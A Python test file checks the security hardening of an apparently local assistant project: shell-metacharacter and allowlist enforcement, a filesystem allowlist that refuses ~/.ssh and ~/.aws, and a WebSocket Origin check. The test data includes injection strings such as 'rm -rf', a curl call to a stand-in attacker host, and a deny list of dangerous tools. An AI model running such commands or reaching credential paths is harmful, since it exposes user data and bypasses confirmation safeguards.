"""Tests for the P0 security hardening added in the audit pass:

- run_shell no longer uses a shell; metacharacters and non-allowlisted
  executables are refused (src/brain/tools.py).
- the Settings write path cannot widen the filesystem allowlist to the
  whole home dir / root / a credential dir, nor drop a mandatory
  confirmation gate (src/system/config.py).
- browser MCP tools are classified read-only vs. confirmation-gated
  (src/brain/browser_tools.py).

All pure Python — no MLX/audio/macOS/Node dependency.
"""

from __future__ import annotations

import asyncio
import sys
from pathlib import Path

import pytest
import websockets
import yaml

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from src.brain.browser_tools import _is_readonly  # noqa: E402
from src.brain.tools import _SHELL_ALLOWED_EXECUTABLES, _run_shell  # noqa: E402
from src.hud.server import HudServer  # noqa: E402
from src.system.config import (  # noqa: E402
    MANDATORY_CONFIRMATIONS,
    Config,  # noqa: E402
    ConfigValidationError,
    _validate_filesystem_allowlist,
    update_config_yaml,
)

# --- run_shell safety -----------------------------------------------------


def test_run_shell_runs_allowlisted_program():
    assert _run_shell({"command": "echo hello"}).strip() == "hello"


@pytest.mark.parametrize("command", [
    "echo a; rm -rf b",       # chaining
    "echo a && rm b",         # chaining
    "cat x | grep y",         # pipe
    "echo `whoami`",          # backtick substitution
    "echo $(whoami)",         # $() substitution
    "cat x > out.txt",        # redirection
    "cat < in.txt",           # redirection
])
def test_run_shell_rejects_shell_metacharacters(command):
    result = _run_shell({"command": command})
    assert result.startswith("Error:")
    assert "not allowed" in result


def test_run_shell_rejects_non_allowlisted_executable():
    result = _run_shell({"command": "curl https://evil.example/x"})
    assert result.startswith("Error:")
    assert "allowed-command list" in result


def test_run_shell_rejects_empty_command():
    assert _run_shell({"command": "   "}).startswith("Error:")


def test_shell_allowlist_excludes_dangerous_tools():
    for dangerous in ("rm", "curl", "wget", "bash", "sh", "ssh", "sudo", "chmod"):
        assert dangerous not in _SHELL_ALLOWED_EXECUTABLES


# --- filesystem allowlist validation --------------------------------------


@pytest.mark.parametrize("bad_entry", [
    "/",
    "~",
    "~/.ssh",
    "~/.aws",
])
def test_allowlist_rejects_overbroad_or_sensitive_paths(bad_entry):
    with pytest.raises(ConfigValidationError):
        _validate_filesystem_allowlist([bad_entry])


def test_allowlist_accepts_scoped_paths():
    # Should not raise.
    _validate_filesystem_allowlist(["~/Documents", "~/Desktop", "."])


def test_save_config_cannot_widen_allowlist_to_root(tmp_path):
    config_path = tmp_path / "config.yaml"
    config_path.write_text(yaml.safe_dump({"filesystem_allowlist": ["~/Documents"]}))
    with pytest.raises(ConfigValidationError):
        update_config_yaml({"filesystem_allowlist": ["/"]}, config_path=config_path)
    # original file must be untouched
    assert yaml.safe_load(config_path.read_text())["filesystem_allowlist"] == ["~/Documents"]


# --- mandatory confirmations cannot be dropped ----------------------------


def test_dropping_mandatory_confirmation_is_reinstated(tmp_path):
    config_path = tmp_path / "config.yaml"
    config_path.write_text(yaml.safe_dump({"require_confirmation_for": ["delete_file"]}))
    # Attempt to clear the confirmation list entirely.
    update_config_yaml({"require_confirmation_for": []}, config_path=config_path)
    saved = yaml.safe_load(config_path.read_text())["require_confirmation_for"]
    for key in MANDATORY_CONFIRMATIONS:
        assert key in saved


# --- browser tool classification ------------------------------------------


@pytest.mark.parametrize("name,readonly", [
    ("browser_snapshot", True),
    ("take_screenshot", True),
    ("console_messages", True),
    ("navigate", False),
    ("click", False),
    ("type", False),
    ("file_upload", False),
    ("handle_dialog", False),
])
def test_browser_readonly_classification(name, readonly):
    assert _is_readonly(name) is readonly


# --- WebSocket cross-site hijacking defense (Origin check) ----------------


def test_hud_websocket_rejects_browser_origin_allows_native():
    """A website the user visits (real https Origin) must NOT be able to
    open the local HUD socket and reach the privileged RPC; a native client
    with no Origin header must still connect."""
    async def scenario():
        server = HudServer(Config())
        results = {}
        server._loop = asyncio.get_running_loop()
        # Bind an ephemeral port (0) so the test never collides with a real
        # HUD server or a leftover socket from another run.
        async with websockets.serve(
            server._handler, "127.0.0.1", 0,
            origins=[None, "null", "file://"], max_size=256 * 1024,
        ) as ws_server:
            port = ws_server.sockets[0].getsockname()[1]
            url = f"ws://127.0.0.1:{port}"

            try:
                async with websockets.connect(
                    url, origin="https://evil.example", open_timeout=3,
                ) as ws:
                    await ws.recv()
                results["evil"] = "connected"
            except Exception:
                results["evil"] = "rejected"

            async with websockets.connect(url, open_timeout=3) as ws:
                await ws.recv()
                results["native"] = "connected"
        return results

    results = asyncio.run(asyncio.wait_for(scenario(), timeout=15))
    assert results["evil"] == "rejected"
    assert results["native"] == "connected"
